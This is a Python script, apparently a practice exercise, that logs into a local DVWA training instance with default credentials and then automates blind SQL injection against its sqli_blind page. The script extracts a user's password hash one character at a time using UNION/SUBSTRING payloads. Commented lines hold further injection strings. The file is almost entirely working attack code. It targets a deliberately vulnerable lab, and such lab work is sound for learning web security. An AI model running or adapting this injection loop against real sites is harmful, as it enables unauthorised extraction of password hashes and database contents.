import requests
import bs4

# username=asd&password=asd&Login=Login&user_token=5bf4e1f60c727b7aa5631bb4542a2a16

s = requests.Session()
awal = s.get("http://127.0.0.1/dvwa/login.php")
soup = bs4.BeautifulSoup(awal.text, 'html.parser')

# Python 2
# token = BeautifulSoup(result.text, 'html.parser').find('input', {'name':'user_token'}).get('value')

token = soup.select('input')[3]['value']

# Harus dictionary
params = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

# Post, data || Get, params

login = s.post("http://127.0.0.1/dvwa/login.php", data=params)
print(login.status_code)
print(login.url)

# Dua duanya bisa
# 1' AND SUBSTRING((SELECT user from users where user = 'admin'),1,1) = 'a' -- -
# ' UNION SELECT user,password from users where password='5F4DcC3B5Aa765D61D8327DEb882CF99' -- -

index = 1
password = ''

while True:
    for i in range(32, 127):
        curr = chr(i)
        serangan = f"' UNION SELECT user,password from users where user = 'pablo' AND SUBSTRING(password,{index},1)='{curr}' -- -"

        payload = {
            "id": serangan,
            "Submit": "Submit"
        }

        sqli = s.get(
            "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/", params=payload)

        soup = bs4.BeautifulSoup(sqli.text, 'html.parser')
        message = soup.find('pre').text

        if "MISSING" in message:
            pass
        else:
            password += curr
            index += 1
            print(f"password_hash = {password}")
            break
